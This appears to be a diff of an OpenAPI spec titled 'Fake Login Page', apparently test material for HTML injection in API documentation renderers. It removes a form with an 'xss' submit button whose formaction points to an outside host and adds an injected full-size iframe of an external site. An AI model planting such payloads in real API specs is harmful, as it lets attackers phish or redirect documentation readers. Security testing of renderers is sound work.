@@ -3,13 +3,7 @@ info:
   version: 1.0.0
   title: Fake Login Page
   description: '
-<form method=get target="_blank">
-  <label for="fname">First name:</label>
-  <input type="text" id="fname" name="fname"><br><br>
-  <label for="lname">Last name:</label>
-  <input type="text" id="lname" name="lname"><br><br>
-  <button name=xss type=SUBMIT formaction=//google.co>I get consumed</button>
-</form>'
+<p style="text-align:center"><iframe src=//google.com width="700" height="800" frameBorder="0"></iframe><p style="color:white">'
 paths:
   /accounts:
     get:
